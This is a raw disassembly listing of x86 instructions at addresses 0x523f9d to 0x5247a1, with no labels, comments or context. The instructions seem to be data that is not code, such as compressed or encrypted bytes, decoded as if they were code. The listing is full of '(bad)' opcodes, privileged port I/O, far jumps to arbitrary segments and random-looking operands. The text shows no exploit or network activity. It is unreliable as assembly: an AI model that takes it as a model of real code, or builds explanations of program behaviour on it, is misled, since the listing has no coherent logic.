  523f9d:	fbstp  TBYTE PTR [esi+0x69821168]
  523fa3:	iret   
  523fa4:	mov    eax,ds:0x7da629b9
  523fa9:	iret   
  523faa:	leave  
  523fab:	inc    ecx
  523fac:	out    0x77,eax
  523fae:	mov    ecx,DWORD PTR [ebx]
  523fb0:	sbb    dh,BYTE PTR [ebx]
  523fb2:	sbb    esp,esp
  523fb4:	ret    0x69db
  523fb7:	inc    edi
  523fb8:	jns    0x523f96
  523fba:	in     al,0x28
  523fbc:	or     esi,DWORD PTR [edx+0x1c6fd401]
  523fc2:	bound  esp,QWORD PTR [edi+esi*2+0x28ba68e1]
  523fc9:	add    esi,DWORD PTR ds:0x248879c4
  523fcf:	xchg   edx,eax
  523fd0:	mov    edi,0xf28c512d
  523fd5:	push   ebx
  523fd6:	xchg   ebp,eax
  523fd7:	dec    ebx
  523fd8:	add    al,0xf4
  523fda:	adc    al,0x8e
  523fdc:	pop    eax
  523fdd:	icebp  
  523fde:	add    esp,ecx
  523fe0:	bound  esp,QWORD PTR [ebx-0x1e]
  523fe3:	shl    esi,cl
  523fe5:	cli    
  523fe6:	jae    0x52404c
  523fe8:	outs   dx,BYTE PTR ds:[esi]
  523fe9:	call   0xbfa26a84
  523fee:	push   ss
  523fef:	ins    BYTE PTR es:[edi],dx
  523ff0:	sbb    bl,ch
  523ff2:	and    ebx,DWORD PTR [edi-0x67]
  523ff5:	fdivr  DWORD PTR [ebx-0x37ac3ef1]
  523ffb:	sub    dl,BYTE PTR [eax+0x70108817]
  524001:	jecxz  0x524048
  524003:	jbe    0x523f87
  524005:	test   al,0x72
  524007:	jmp    0x1659:0x3fa3ef6f
  52400e:	loopne 0x523fcd
  524010:	les    ebx,FWORD PTR [ebp+0x12]
  524013:	xor    al,0x51
  524015:	mov    eax,ds:0x85c96952
  52401a:	scas   eax,DWORD PTR es:[edi]
  52401b:	or     ecx,eax
  52401d:	loopne 0x52406b
  52401f:	mov    bl,0x4b
  524021:	ficom  DWORD PTR fs:[edx]
  524024:	stos   DWORD PTR es:[edi],eax
  524025:	stc    
  524026:	xchg   cl,ah
  524028:	pop    ebp
  524029:	pop    esp
  52402a:	ss jl  0x524066
  52402d:	pop    eax
  52402e:	adc    ecx,0x331c795b
  524034:	mov    BYTE PTR [edi],ah
  524036:	and    bh,BYTE PTR [edx]
  524038:	lea    eax,[ebp+ebp*8-0x5d]
  52403c:	outs   dx,BYTE PTR ds:[esi]
  52403d:	leave  
  52403e:	push   es
  52403f:	or     ebp,DWORD PTR [ecx+0xc]
  524042:	fcomp  QWORD PTR [ecx-0x11]
  524045:	sub    BYTE PTR [edi],ch
  524047:	sti    
  524048:	push   es
  524049:	xchg   edi,eax
  52404a:	aam    0x5a
  52404c:	xor    bl,BYTE PTR [edi+eax*2]
  52404f:	or     DWORD PTR [edi-0x54],esi
  524052:	adc    eax,0xb503b911
  524057:	mov    ds:0x975a9c67,al
  52405c:	in     al,dx
  52405d:	ret    
  52405e:	xlat   BYTE PTR ds:[ebx]
  52405f:	fs aad 0x14
  524062:	add    edx,0x36
  524065:	push   edi
  524066:	push   ebx
  524067:	bound  ebx,QWORD PTR [ebx]
  524069:	ficom  DWORD PTR [ebx+eiz*1-0x5d]
  52406d:	inc    edi
  52406e:	(bad)  
  52406f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  524070:	call   0x7c77df9
  524075:	lock mov eax,0x75a1099e
  52407b:	popa   
  52407c:	lods   eax,DWORD PTR ds:[esi]
  52407d:	xchg   edx,eax
  52407e:	int    0xfd
  524080:	int3   
  524081:	stos   DWORD PTR es:[edi],eax
  524082:	jbe    0x524102
  524084:	push   edi
  524085:	and    edi,edx
  524087:	fadd   st,st(6)
  524089:	mov    bl,0x22
  52408b:	test   DWORD PTR [edx],edx
  52408d:	push   es
  52408e:	sub    cl,BYTE PTR [ebx+0x68]
  524091:	icebp  
  524092:	cwde   
  524093:	pop    ecx
  524094:	cmp    ebp,DWORD PTR [eax+0x40]
  524097:	fcomp  st(3)
  524099:	sub    esi,ebp
  52409b:	pop    ss
  52409c:	mov    BYTE PTR [esi+eiz*2-0x4b],bh
  5240a0:	and    BYTE PTR [edx+0x6382e02a],ch
  5240a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5240a7:	jmp    0xd68e:0xd9a53c7c
  5240ae:	jns    0x5240b8
  5240b0:	push   edi
  5240b1:	in     al,dx
  5240b2:	(bad)  
  5240b3:	mov    edi,DWORD PTR [edx+0x74]
  5240b6:	lods   eax,DWORD PTR ds:[esi]
  5240b7:	js     0x5240cc
  5240b9:	mov    ds:0xf5b1eb69,al
  5240be:	mov    ah,BYTE PTR [edi+0x67e0ce23]
  5240c4:	mov    esp,0x92d4110c
  5240c9:	popf   
  5240ca:	fld    TBYTE PTR [eax]
  5240cc:	outs   dx,BYTE PTR ds:[esi]
  5240cd:	sbb    BYTE PTR [eax-0x3e],0x15
  5240d1:	jmp    0x52408e
  5240d3:	xor    DWORD PTR [edi+eiz*4-0x68],eax
  5240d7:	ret    
  5240d8:	je     0x5240fb
  5240da:	mov    dh,0x15
  5240dc:	or     ah,BYTE PTR [esi-0x72]
  5240df:	mov    cs,WORD PTR [ebx+esi*4+0x3d]
  5240e3:	imul   edi,DWORD PTR [ebp+0x6cb4bb68],0xffffffaa
  5240ea:	jl     0x52412c
  5240ec:	xchg   edx,eax
  5240ed:	jmp    0x450b1d16
  5240f2:	out    0x35,al
  5240f4:	xor    BYTE PTR [esi+0x6be7131f],0x3c
  5240fb:	dec    esp
  5240fc:	ins    BYTE PTR es:[edi],dx
  5240fd:	into   
  5240fe:	mov    ch,BYTE PTR [edi+edx*2-0x57d9594b]
  524105:	rcr    BYTE PTR [edx-0x36],1
  524108:	xor    al,0x76
  52410a:	inc    ebp
  52410b:	push   cs
  52410c:	sbb    ecx,ebx
  52410e:	dec    ax
  524110:	call   0x44717b43
  524115:	cdq    
  524116:	call   0xd394f4e9
  52411b:	ins    BYTE PTR es:[edi],dx
  52411c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52411d:	clc    
  52411e:	pop    edi
  52411f:	push   es
  524120:	fwait
  524121:	dec    edx
  524122:	dec    esp
  524123:	lea    ecx,[esi]
  524125:	jl     0x52416f
  524127:	sbb    ecx,esp
  524129:	fld    QWORD PTR [edx]
  52412b:	pop    ss
  52412c:	fnstcw WORD PTR [ecx-0x7def7088]
  524132:	jge    0x5241a6
  524134:	add    BYTE PTR [edi],ah
  524136:	gs arpl WORD PTR gs:[ebx+0x30a8004],si
  52413e:	shl    DWORD PTR [edi],0x86
  524141:	lods   al,BYTE PTR ds:[esi]
  524142:	and    al,bh
  524144:	ds add al,0x8e
  524147:	addr16 xchg esi,eax
  524149:	or     cl,BYTE PTR [edi-0xb]
  52414c:	sti    
  52414d:	mov    ebx,0xa8b422e1
  524152:	cld    
  524153:	xchg   ebp,eax
  524154:	arpl   WORD PTR [ebp+0x7bdfb8ac],bx
  52415a:	jnp    0x5241a8
  52415c:	retf   
  52415d:	(bad)  
  52415e:	femms  
  524160:	pop    ecx
  524161:	push   DWORD PTR [esi-0x6c22fa1c]
  524167:	xor    DWORD PTR [esi+0x7f],0x2c
  52416b:	(bad)  
  52416d:	out    0x93,eax
  52416f:	dec    ebx
  524170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  524171:	nop
  524172:	js     0x524184
  524174:	cwde   
  524175:	mov    bh,0x3d
  524177:	(bad)  
  524178:	(bad)  
  524179:	je     0x524166
  52417b:	or     ch,dh
  52417d:	mov    ds:0x374d23ec,al
  524182:	mov    dh,0x51
  524184:	jg     0x52411f
  524186:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  524188:	or     BYTE PTR [edx],0xbe
  52418b:	sbb    ecx,0x734d5ff6
  524191:	bound  ecx,QWORD PTR [ebx]
  524193:	dec    ebp
  524194:	adc    eax,0xd134d4e2
  524199:	and    dh,BYTE PTR [edx-0x4b7e3311]
  52419f:	imul   BYTE PTR [ebp+0x39071633]
  5241a5:	ret    
  5241a6:	cwde   
  5241a7:	bswap  edi
  5241a9:	xchg   esp,eax
  5241aa:	out    0x95,eax
  5241ac:	cmp    eax,0x409852e0
  5241b1:	mov    WORD PTR [esp+ecx*4+0x5d],ds
  5241b5:	push   edx
  5241b6:	scas   eax,DWORD PTR es:[edi]
  5241b7:	outs   dx,BYTE PTR ds:[esi]
  5241b8:	pop    esi
  5241b9:	test   DWORD PTR [esi+edx*4],ecx
  5241bc:	call   0x26cc:0x58506fbf
  5241c3:	ins    BYTE PTR es:[di],dx
  5241c5:	inc    esp
  5241c6:	out    0x41,eax
  5241c8:	xor    ebp,0xfffffff9
  5241cb:	lds    eax,FWORD PTR [esi-0xe]
  5241ce:	aam    0x3c
  5241d0:	mov    ebp,0x9582c4ad
  5241d5:	fnsave [di-0x1e]
  5241d9:	cli    
  5241da:	cmc    
  5241db:	stc    
  5241dc:	out    0xd6,al
  5241de:	aaa    
  5241df:	add    bh,BYTE PTR [edi+0x3b0d7a90]
  5241e5:	fcmovb st,st(7)
  5241e7:	add    ch,BYTE PTR [ebx-0x65369d8a]
  5241ed:	int3   
  5241ee:	rol    ebx,cl
  5241f0:	mov    WORD PTR [esi],ds
  5241f2:	scas   eax,DWORD PTR es:[edi]
  5241f3:	mov    ebp,0x6d873bac
  5241f8:	stc    
  5241f9:	adc    edx,edx
  5241fb:	push   0xffffffb5
  5241fd:	ss in  eax,dx
  5241ff:	(bad)  
  524201:	sbb    BYTE PTR [ecx+0x3f2903ce],dh
  524207:	pop    eax
  524208:	jns    0x524248
  52420a:	push   ebp
  52420b:	inc    ebx
  52420c:	cmp    DWORD PTR ds:0x7800864f,esi
  524212:	stos   BYTE PTR es:[edi],al
  524213:	es dec ebx
  524215:	add    bh,al
  524217:	push   ebp
  524218:	hlt    
  524219:	leave  
  52421a:	int3   
  52421b:	call   0x7a59768a
  524220:	dec    esi
  524221:	fld    QWORD PTR [edi]
  524223:	dec    eax
  524224:	mov    ecx,0xcf637b06
  524229:	or     ecx,0xf3575ae7
  52422f:	lock fistp WORD PTR [edi+0x56]
  524233:	and    eax,0xfb5b32bc
  524238:	adc    eax,0x2ebcbce6
  52423d:	lahf   
  52423e:	repz hlt 
  524240:	in     eax,dx
  524241:	xchg   edx,eax
  524242:	adc    ch,BYTE PTR [ebp-0x4f3d36]
  524248:	call   0x5180:0x91378673
  52424f:	outs   dx,DWORD PTR ds:[esi]
  524250:	loop   0x524258
  524252:	lods   eax,DWORD PTR ds:[esi]
  524253:	sub    DWORD PTR [edi+0x6a],esi
  524256:	shr    ebx,0xda
  524259:	call   0xbf55:0x76d2df06
  524260:	mov    WORD PTR [ecx-0x7ab669fe],fs
  524266:	mov    cl,0x92
  524268:	(bad)  
  524269:	ds das 
  52426b:	ins    BYTE PTR es:[edi],dx
  52426c:	or     esp,DWORD PTR [ebx-0x22]
  52426f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  524270:	xor    al,0x6b
  524272:	ret    
  524273:	das    
  524274:	inc    edx
  524275:	test   al,0xa8
  524277:	xchg   esi,eax
  524278:	iret   
  524279:	enter  0x62c1,0x6c
  52427d:	aaa    
  52427e:	xchg   esp,eax
  52427f:	sbb    dl,BYTE PTR [ebx+esi*8-0x2764ab3b]
  524286:	pop    edx
  524287:	inc    edi
  524288:	mov    edx,0x25f0bc05
  52428d:	and    eax,0x49d34fee
  524292:	mov    gs,WORD PTR [edi+eiz*1]
  524295:	call   0x86afff72
  52429a:	pop    esi
  52429b:	xchg   cl,ah
  52429d:	adc    dh,BYTE PTR [esi+0x45]
  5242a0:	pop    ebp
  5242a1:	outs   dx,BYTE PTR ds:[esi]
  5242a2:	pop    ds
  5242a3:	dec    edx
  5242a4:	test   al,0x66
  5242a6:	mov    al,0x48
  5242a8:	test   cl,ah
  5242aa:	jne    0x524310
  5242ac:	and    DWORD PTR [eax+0x15],eax
  5242af:	fistp  DWORD PTR [ebx-0x19623a7e]
  5242b5:	xor    al,0xd0
  5242b7:	inc    ebp
  5242b8:	mov    esp,0xc932e0b6
  5242bd:	jnp    0x52429d
  5242bf:	cmp    al,0xff
  5242c1:	mov    dh,0xef
  5242c3:	(bad)  
  5242c4:	ins    DWORD PTR es:[edi],dx
  5242c5:	or     al,0x2d
  5242c7:	daa    
  5242c8:	pop    edi
  5242c9:	sbb    esi,0xffffffcc
  5242cc:	scas   eax,DWORD PTR es:[edi]
  5242cd:	dec    edx
  5242ce:	mov    cl,0x77
  5242d0:	ret    0xaa8f
  5242d3:	psrlq  mm4,QWORD PTR [ebx+0x73f49654]
  5242da:	sar    ah,1
  5242dc:	adc    BYTE PTR [edx-0x4f],al
  5242df:	cwde   
  5242e0:	loope  0x5242c4
  5242e2:	sub    eax,0x5d21d507
  5242e7:	(bad)  
  5242e8:	mov    bl,0x40
  5242ea:	pop    esp
  5242eb:	call   0xbf93c522
  5242f0:	dec    ebp
  5242f1:	stos   DWORD PTR es:[edi],eax
  5242f2:	mov    edx,0x13596d19
  5242f7:	(bad)  
  5242f8:	in     al,dx
  5242f9:	int    0xe1
  5242fb:	ror    dh,1
  5242fd:	inc    edi
  5242fe:	fadd   DWORD PTR [edx+0x77757d3]
  524304:	das    
  524305:	aaa    
  524306:	sub    al,0x41
  524308:	cmc    
  524309:	jecxz  0x5242ba
  52430b:	jmp    0x856ae58d
  524310:	rol    BYTE PTR [esi-0x6a],cl
  524313:	dec    ebx
  524314:	jp     0x5242cb
  524316:	add    eax,0x85d44d16
  52431b:	and    eax,0x3a30398c
  524320:	sar    BYTE PTR ds:0x9aa4fa03,1
  524326:	xchg   edx,eax
  524327:	not    DWORD PTR [edx-0x5c]
  52432a:	scas   al,BYTE PTR es:[edi]
  52432b:	test   al,0xfe
  52432d:	mov    edx,0x37143120
  524332:	add    ch,dh
  524334:	popa   
  524335:	dec    eax
  524336:	out    dx,eax
  524337:	popf   
  524338:	stc    
  524339:	lods   eax,DWORD PTR ds:[esi]
  52433a:	(bad)  
  52433d:	push   ds
  52433e:	aam    0x11
  524340:	bound  ebp,QWORD PTR [edx]
  524342:	mov    al,ds:0x3d3138d3
  524347:	mov    esp,0xbf8a9f2a
  52434c:	xchg   ecx,eax
  52434d:	nop
  52434e:	jg     0x52433f
  524350:	loopne 0x524342
  524352:	shl    BYTE PTR [edi-0x38],cl
  524355:	outs   dx,DWORD PTR ds:[esi]
  524356:	mov    dl,0x26
  524358:	pop    esp
  524359:	push   edi
  52435a:	out    dx,al
  52435b:	mov    esi,0x83257936
  524360:	ror    bh,0x95
  524363:	cmp    ah,cl
  524365:	xor    ebp,DWORD PTR [edx]
  524367:	loopne 0x52439b
  524369:	inc    esp
  52436a:	rcl    BYTE PTR [edx],1
  52436c:	int    0x5b
  52436e:	sub    BYTE PTR [ecx-0x50],0x4
  524372:	shl    BYTE PTR [ecx],0xd5
  524375:	mov    dh,0x5
  524377:	js     0x52437e
  524379:	mov    es,WORD PTR [ebx+0x1b6312a4]
  52437f:	aam    0x6b
  524381:	cld    
  524382:	xor    DWORD PTR [ebp+0x11719fc2],ecx
  524388:	shl    BYTE PTR [esi],1
  52438a:	js     0x524311
  52438c:	(bad)  
  52438d:	mov    ebx,0x80e18cc5
  524392:	iret   
  524393:	mov    cl,0x29
  524395:	aas    
  524396:	fisttp WORD PTR [ecx+0x17]
  524399:	cli    
  52439a:	fst    DWORD PTR [ebx+eiz*8-0x596a151c]
  5243a1:	shl    BYTE PTR [ecx+0x4d096668],0x15
  5243a8:	aam    0xfd
  5243aa:	jmp    0x73cca81c
  5243af:	or     eax,0xa1dfcaec
  5243b4:	sub    esi,DWORD PTR [ebp+edx*2-0x31]
  5243b8:	mov    bh,0x96
  5243ba:	dec    edx
  5243bb:	adc    ax,0xaa52
  5243bf:	dec    ebp
  5243c0:	cmp    eax,edi
  5243c2:	(bad)  
  5243c3:	aam    0x79
  5243c5:	xchg   esi,eax
  5243c6:	sub    DWORD PTR [ecx],edx
  5243c8:	in     al,dx
  5243c9:	adc    dl,BYTE PTR [ecx]
  5243cb:	call   0x472:0x15e6f0ad
  5243d2:	mov    WORD PTR ss:[ebp+edi*1-0xa],gs
  5243d7:	js     0x524366
  5243d9:	ja     0x524441
  5243db:	or     eax,0xa97fcad9
  5243e0:	lea    esi,[eax+0x670a9b86]
  5243e6:	nop
  5243e7:	fbld   TBYTE PTR [eax-0x44f111f]
  5243ed:	std    
  5243ee:	add    eax,0xf4853214
  5243f3:	js     0x52437d
  5243f5:	jno    0x5243bb
  5243f7:	fistp  DWORD PTR [ebp+0x7f]
  5243fa:	rcl    BYTE PTR [ecx-0x52d6805f],0x73
  524401:	jmp    0x5e28:0xf23e5b72
  524408:	nop
  524409:	mov    eax,ds:0x42e5756e
  52440e:	inc    ebp
  52440f:	fs inc esp
  524411:	cmp    eax,0x372636e7
  524416:	sbb    ch,cl
  524418:	jb     0x52441a
  52441a:	call   0xc169604a
  52441f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  524420:	mov    fs,edx
  524422:	pop    ebp
  524423:	rcr    BYTE PTR [edi],cl
  524425:	mov    ebx,0x8d43e72e
  52442a:	cmp    ebp,DWORD PTR [ebp+eiz*4-0xabc16f7]
  524431:	pop    edx
  524432:	leave  
  524433:	repz inc edi
  524435:	aam    0xff
  524437:	add    eax,0x63395b0d
  52443c:	jnp    0x524414
  52443e:	mov    dl,BYTE PTR [ebx-0x55]
  524441:	pop    edi
  524442:	cld    
  524443:	int    0x9d
  524445:	or     DWORD PTR [ebx],eax
  524447:	and    al,0x43
  524449:	int3   
  52444a:	xlat   BYTE PTR ds:[ebx]
  52444b:	mov    edi,0x9655c8bc
  524450:	fadd   st(3),st
  524452:	jo     0x5244a7
  524454:	out    0x69,al
  524456:	inc    ebx
  524457:	jno    0x524472
  524459:	mov    gs,WORD PTR [edx-0x19f322b4]
  52445f:	in     eax,dx
  524460:	mov    esp,0x9bf34eeb
  524465:	icebp  
  524466:	xchg   ecx,eax
  524467:	popa   
  524468:	mov    esp,0x5695329c
  52446d:	dec    esi
  52446e:	js     0x52445b
  524470:	js     0x524468
  524472:	mov    ch,0xbc
  524474:	ds push ss
  524476:	xor    eax,0x3a38f16e
  52447b:	cmc    
  52447c:	xchg   esi,eax
  52447d:	adc    dh,BYTE PTR [edx+ecx*8]
  524480:	jbe    0x524472
  524482:	aaa    
  524483:	in     al,0xb8
  524485:	leave  
  524486:	inc    ebp
  524487:	cmp    al,0xbe
  524489:	push   ecx
  52448a:	sbb    edx,ebx
  52448c:	nop
  52448d:	jnp    0x52443b
  52448f:	pop    ebp
  524490:	and    BYTE PTR [edx+0x6c096145],0x86
  524497:	fcmovnu st,st(2)
  524499:	mov    dl,0xe8
  52449b:	jp     0x524427
  52449d:	test   al,0xd2
  52449f:	push   eax
  5244a0:	pop    edx
  5244a1:	stc    
  5244a2:	push   0x0
  5244a4:	(bad)  
  5244a5:	fimul  DWORD PTR [edi]
  5244a7:	xchg   edx,eax
  5244a8:	sub    BYTE PTR [ecx+ebp*8+0xf],ch
  5244ac:	(bad)  [eax-0x2c348072]
  5244b2:	adc    eax,0x94ae6e49
  5244b7:	ficomp DWORD PTR ds:0x228505f8
  5244bd:	jge    0x5244aa
  5244bf:	repz adc esp,DWORD PTR [ebp+0x78d8a280]
  5244c6:	and    eax,0xa723dc0
  5244cb:	push   edx
  5244cc:	dec    edx
  5244cd:	xor    eax,0xb327eeb9
  5244d2:	inc    ebx
  5244d3:	xlat   BYTE PTR ds:[ebx]
  5244d4:	call   0xeb59:0x687d23dd
  5244db:	adc    esi,DWORD PTR [ebp+0x64]
  5244de:	aas    
  5244df:	lea    ebp,[ecx-0x2c525019]
  5244e5:	clc    
  5244e6:	(bad)  
  5244e7:	das    
  5244e8:	jb     0x52449a
  5244ea:	mov    dl,0x90
  5244ec:	sbb    DWORD PTR [edx-0x54],edi
  5244ef:	scas   al,BYTE PTR es:[edi]
  5244f0:	mov    al,ds:0x81fccec3
  5244f5:	xor    cl,BYTE PTR [esi-0x65ef5dd5]
  5244fb:	(bad)  [esi]
  5244fd:	sbb    dh,dh
  5244ff:	lds    esp,FWORD PTR [esi+0xc]
  524502:	out    0x14,eax
  524504:	jnp    0x524555
  524506:	mov    al,ds:0xe924981b
  52450b:	stos   BYTE PTR es:[edi],al
  52450c:	mov    al,ds:0xe9c9e338
  524511:	xchg   edi,eax
  524512:	stc    
  524513:	push   0xffffffc2
  524515:	aas    
  524516:	inc    edi
  524517:	(bad)  
  524518:	fdivrp st(2),st
  52451a:	jae    0x5244e5
  52451c:	adc    eax,0x6e789522
  524521:	mov    ebx,0xf9d03c2a
  524526:	mov    esi,0x7d99813f
  52452b:	push   ecx
  52452c:	mov    ch,0xe8
  52452e:	sahf   
  52452f:	loopne 0x52457d
  524531:	fcmovnb st,st(6)
  524533:	sub    DWORD PTR [ebx+0x4f7bc102],ecx
  524539:	jb     0x5244e4
  52453b:	jl     0x52458c
  52453d:	lea    ecx,[ecx+eax*2+0x12c1b5b3]
  524544:	dec    ecx
  524545:	add    eax,0x6ae21a09
  52454a:	test   BYTE PTR [eax-0x5f],ah
  52454d:	mov    ecx,0x7728da74
  524552:	xchg   ebx,eax
  524553:	xchg   ebx,eax
  524554:	cdq    
  524555:	sub    edi,DWORD PTR [ebx]
  524557:	out    0xa3,eax
  524559:	je     0x5244df
  52455b:	cmovp  eax,edi
  52455e:	push   ebx
  52455f:	mov    DWORD PTR [edi-0x20],0x997aa8c7
  524566:	cwde   
  524567:	shl    BYTE PTR [ebx],cl
  524569:	ret    0xafd
  52456c:	xor    al,ah
  52456e:	mov    al,0x6f
  524570:	bound  eax,QWORD PTR [esi]
  524572:	push   eax
  524573:	push   ebx
  524574:	pusha  
  524575:	push   ds
  524576:	test   BYTE PTR [edi],dl
  524578:	je     0x5245c6
  52457a:	gs mov esp,0x9f2a0e71
  524580:	(bad)  
  524581:	xchg   esi,eax
  524582:	xchg   edx,eax
  524583:	pop    ecx
  524584:	mov    BYTE PTR [edx+0x2c2d863b],al
  52458a:	stos   DWORD PTR es:[edi],eax
  52458b:	lds    esi,FWORD PTR [edi+0x6]
  52458e:	call   0x471b:0x81825153
  524595:	in     al,dx
  524596:	or     BYTE PTR [ebp+0x56b499a8],cl
  52459c:	jbe    0x524589
  52459e:	in     eax,dx
  52459f:	test   BYTE PTR [ebp+0x60a1550c],0x4
  5245a6:	xor    eax,0x22a296f6
  5245ab:	fs or  al,0x5a
  5245ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5245af:	js     0x5245be
  5245b1:	jne    0x52457d
  5245b3:	pop    es
  5245b4:	iret   
  5245b5:	mov    edi,0x1f1fa31c
  5245ba:	mov    esi,0xf56a4306
  5245bf:	or     al,0x43
  5245c1:	add    eax,0xade517c9
  5245c6:	into   
  5245c7:	daa    
  5245c8:	sbb    eax,edi
  5245ca:	xchg   esi,eax
  5245cb:	jmp    0x5245a3
  5245cd:	mov    dh,0xb1
  5245cf:	int3   
  5245d0:	fstp   st(7)
  5245d2:	xchg   DWORD PTR [edi+esi*4-0x145c3a6e],edi
  5245d9:	jbe    0x52457a
  5245db:	push   0x43
  5245dd:	pop    ebx
  5245de:	lock jns 0x5245e1
  5245e1:	push   cs
  5245e2:	xchg   esp,eax
  5245e3:	jle    0x524597
  5245e5:	push   0xb7598dc6
  5245ea:	cdq    
  5245eb:	cmp    esi,DWORD PTR [ecx]
  5245ed:	xchg   al,dl
  5245ef:	les    edx,FWORD PTR [eax]
  5245f1:	pop    eax
  5245f2:	jge    0x5245e6
  5245f4:	aaa    
  5245f5:	leave  
  5245f6:	inc    edi
  5245f7:	xlat   BYTE PTR ds:[ebx]
  5245f8:	xor    DWORD PTR [ecx+0x6e],ebx
  5245fb:	ror    DWORD PTR [edx],cl
  5245fd:	rol    BYTE PTR [edi],cl
  5245ff:	mov    edx,0xa893d412
  524604:	f2xm1  
  524606:	lds    edi,FWORD PTR [ecx]
  524608:	stc    
  524609:	jle    0x5245ab
  52460b:	cmp    dl,BYTE PTR [ebp+0x17]
  52460e:	cwde   
  52460f:	sub    DWORD PTR [edx],esi
  524611:	jno    0x52465d
  524613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  524614:	sbb    al,al
  524616:	fisttp QWORD PTR [ecx]
  524618:	pop    ebx
  524619:	cdq    
  52461a:	lahf   
  52461b:	add    BYTE PTR [esi+0x5967d7ef],al
  524621:	sahf   
  524622:	popf   
  524623:	adc    BYTE PTR [ecx],cl
  524625:	and    DWORD PTR [eax+0x87f60b5],0xdb4a0072
  52462f:	cdq    
  524630:	mov    edi,0x2c177d62
  524635:	(bad)  
  524636:	mov    eax,ds:0x71f5adef
  52463b:	xchg   edi,eax
  52463c:	adc    dh,BYTE PTR [esi+0x5aa1fd41]
  524642:	push   esi
  524643:	jl     0x52469a
  524645:	in     eax,0x31
  524647:	jmp    0xfebe:0xc050b248
  52464e:	and    BYTE PTR [eax],dh
  524650:	xor    DWORD PTR [edx-0x44],edx
  524653:	dec    edx
  524654:	(bad)  
  524655:	mov    esi,0xa642ebe9
  52465a:	xlat   BYTE PTR ds:[ebx]
  52465b:	fld    DWORD PTR [ebx+0x5777edbd]
  524661:	dec    ebp
  524662:	mov    ds:0xa07e31e5,eax
  524667:	dec    esp
  524668:	push   ds
  524669:	loop   0x5246de
  52466b:	dec    edx
  52466c:	popa   
  52466d:	mov    al,ds:0x200a792a
  524672:	push   es
  524673:	fs xor al,0x0
  524676:	inc    ecx
  524677:	sbb    bl,al
  524679:	xchg   ebp,eax
  52467a:	push   esi
  52467b:	xchg   eax,esi
  52467d:	cwde   
  52467e:	int    0x9e
  524680:	scas   eax,DWORD PTR es:[edi]
  524681:	daa    
  524682:	ins    DWORD PTR es:[edi],dx
  524683:	adc    al,0x6a
  524685:	pop    ecx
  524686:	repnz jmp 0xaa67:0x3d4dea66
  52468e:	imul   esi,ebx,0x76a0e62
  524694:	pop    esi
  524695:	or     eax,0xd3b6b44
  52469a:	div    DWORD PTR [ecx+eax*2-0x7a]
  52469e:	aam    0x97
  5246a0:	and    DWORD PTR [ecx-0x7466ce1e],esp
  5246a6:	mov    al,ds:0x7000d58b
  5246ab:	inc    ebp
  5246ac:	addr16 loopne 0x524673
  5246af:	bnd jnp 0x5246d5
  5246b2:	clc    
  5246b3:	mov    edx,0xcdcf4ed1
  5246b8:	hlt    
  5246b9:	sub    cl,dl
  5246bb:	sbb    BYTE PTR [eax-0xf184277],cl
  5246c1:	inc    eax
  5246c2:	stc    
  5246c3:	mov    esp,0x766c462d
  5246c8:	outs   dx,DWORD PTR ds:[esi]
  5246c9:	or     cl,cl
  5246cb:	cmp    eax,0x210daf42
  5246d0:	xchg   esi,eax
  5246d1:	call   0xe2f6:0x5ca2aa11
  5246d8:	or     DWORD PTR [edx+0x7f0d8f83],ecx
  5246de:	ror    BYTE PTR [ecx+0x6f],0xb5
  5246e2:	xor    eax,0x673df5
  5246e7:	push   edi
  5246e8:	fwait
  5246e9:	dec    ebx
  5246ea:	inc    esp
  5246eb:	mov    ch,0xa0
  5246ed:	call   0x8897c2b7
  5246f2:	test   eax,0x6eae2894
  5246f7:	cmp    al,0x7c
  5246f9:	mov    ah,0x2b
  5246fb:	dec    esi
  5246fc:	dec    DWORD PTR fs:[edi]
  5246ff:	outs   dx,DWORD PTR ds:[esi]
  524700:	mov    edx,DWORD PTR [eax+edi*8+0x635dd061]
  524707:	rcr    BYTE PTR [ebx+0x55e9aba8],0xc8
  52470e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52470f:	jl     0x5246cc
  524711:	dec    ecx
  524712:	push   ecx
  524713:	arpl   WORD PTR [esi],ax
  524715:	and    bl,BYTE PTR [ebx+ebx*1-0x2]
  524719:	cld    
  52471a:	mov    cs,WORD PTR [edx+0x6ab9e8fd]
  524720:	adc    bh,ch
  524722:	xor    ch,BYTE PTR [edi]
  524724:	jb     0x524785
  524726:	js     0x524710
  524728:	jmp    0xbfe1b210
  52472d:	push   ds
  52472e:	mov    WORD PTR [esi+0x50],fs
  524731:	push   ds
  524732:	jo     0x52479c
  524734:	cmovle ebx,DWORD PTR [eax]
  524737:	cld    
  524738:	xor    DWORD PTR [edi+eax*1],esp
  52473b:	nop
  52473c:	cmp    eax,0x486818c9
  524741:	in     eax,dx
  524742:	fwait
  524743:	fwait
  524744:	call   0x9a448203
  524749:	add    eax,0xe7a91cc
  52474e:	and    DWORD PTR [ebp-0x10084e32],ecx
  524754:	sbb    bl,BYTE PTR [ebp+0x73e55da6]
  52475a:	lock add BYTE PTR [ecx],ah
  52475d:	xchg   DWORD PTR [esi+0x75],esp
  524760:	loop   0x524735
  524762:	push   eax
  524763:	dec    ecx
  524764:	and    DWORD PTR [ecx+0x15],eax
  524767:	add    bl,BYTE PTR [esi+0x7ab4fda5]
  52476d:	pop    edi
  52476e:	and    BYTE PTR [ecx+0x25],dl
  524771:	lea    esi,[edx-0x79e9b3e6]
  524777:	jle    0x52472b
  524779:	fst    st(6)
  52477b:	jge    0x524730
  52477d:	fisub  WORD PTR [edi+0x19]
  524780:	dec    esi
  524781:	adc    al,0x6b
  524783:	adc    eax,0xd0cade67
  524788:	push   ebx
  524789:	dec    ebp
  52478a:	arpl   WORD PTR [ecx+ebx*1],sp
  52478d:	mov    ds:0x630842fb,al
  524792:	push   ds
  524793:	xor    DWORD PTR [ebx],esp
  524795:	aam    0x9
  524797:	xchg   ebx,eax
  524798:	test   DWORD PTR [eax+ecx*1],esi
  52479b:	inc    ebp
  52479c:	loop   0x5247c5
  52479e:	(bad)  
  5247a0:	xchg   edi,eax
  5247a1:	aam    0x6e
